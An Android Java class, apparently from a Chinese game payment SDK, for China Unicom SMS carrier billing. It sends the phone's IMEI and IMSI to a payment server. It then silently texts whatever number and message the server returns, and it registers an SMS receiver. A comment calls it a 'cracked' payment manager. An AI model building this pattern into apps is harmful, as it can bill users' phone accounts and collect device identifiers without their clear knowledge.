package mobi.zty.pay.sdk.unicomFee;

import java.io.IOException;
import java.net.URLEncoder;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.Base64;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

import com.kuyun.chinaunicom.sms.SMSReceiver;


/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class UnicomFeeInstance extends PaymentInterf{
	private static UnicomFeeInstance instance;
	private Handler callBHandler = null;
	public static UnicomFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized UnicomFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new UnicomFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		SMSReceiver receiver =SMSReceiver.registerReceiver(context);
		if (receiver!=null) {
			Util_G.debugE("ALLPAY", "注册广播成功");
		}
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		
		final String merid = (String) parameters[0];
		final String goodsid = (String) parameters[1];
		final String imsi = (String) parameters[2];
		final String imei = (String) parameters[3];
		final String orderid = (String) parameters[4];
		final String appname = (String) parameters[5];
		final String pay_url = (String) parameters[6];
		final String signtype = (String) parameters[7];
		final String Skey = (String) parameters[8];
		final String notifyurl = (String) parameters[9];
		final String subject = (String) parameters[10];
		
	
		final String createtime = Helper.getNowTime();
		
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						String express = "createtime="+createtime+"&goodsid="+goodsid+"&imei="+imei+"&imsi="+imsi+
								"&merid="+merid+"&orderid="+orderid;
						byte[] b = Helper.hmac_sha1(express, Skey,signtype);
						
			    		String sign = URLEncoder.encode(Base64.encode(b), "UTF-8");
						
						String url = pay_url+"?"+express+"&appname="
								+URLEncoder.encode(appname, "UTF-8")+"&signtype="+Skey+"&sign="+sign+
								"&subject="+URLEncoder.encode(subject, "UTF-8")+"&notifyurl="+notifyurl;
						String requestResponse = reqTianYiPay(url);
						Util_G.debugE("PAY", requestResponse);
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							JSONObject result = new JSONObject(requestResponse);
							if (result.getString("retcode").equals("0000")) {//订单获取成
								String trade_NO = result.getString("orderid");
								if (orderid.equals(trade_NO)) {//如果订单不对 不做处理
									String send_num = result.getString("accessno");
									String sms_content = result.getString("sms");
									callBHandler.removeMessages(PayConfig.NATIVE_FEE_FAIL);
									callBHandler.sendEmptyMessageDelayed(PayConfig.NATIVE_FEE_FAIL, 20000);
									Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
							        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
							        GameSDK.getInstance().bCallback = 0; 
							        Util_G.sendTextMessage(context, send_num, sms_content, mSendPI, 0);
							        Util_G.debugE("wo+_pay", "pay_data->"+sms_content);
							        isSendMsg = true;
								}
							}else{
								Util_G.debugE("MUZHI_PAY", result.getString("retmsg"));
							}
						} 
						if (!isSendMsg) {
							PayResultInfo info = new PayResultInfo();
							info.resutCode = PayConfig.UNICON_FEE_FAIL;
							info.retMsg = "发送短信失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
				    	
					} catch (Exception e) {
						PayResultInfo info = new PayResultInfo();
						info.resutCode = PayConfig.UNICON_FEE_FAIL;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();
	}
	
	/**
	 * 微米付通支付
	 */
	private String reqTianYiPay(String url) {
		String result = null;
		HttpGet httpGet = new HttpGet(url);
		Util_G.debugE("wo+支付的URL", url);
		DefaultHttpClient httpClient = new DefaultHttpClient();
		httpClient.getParams().setParameter(
				CoreConnectionPNames.CONNECTION_TIMEOUT, 6000);
		httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT,
				6000);
		try {
			HttpResponse httpResp = httpClient.execute(httpGet);
			if (httpResp.getStatusLine().getStatusCode() == 200) {
				result = EntityUtils.toString(httpResp.getEntity(), "UTF-8");
			} else {
				Util_G.debugE("httpGet", "httpGet方式请求失败");
			}
		} catch (ConnectTimeoutException e) {
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		Util_G.debugE("wo+支付情况：", result);
		return result;
	}
}
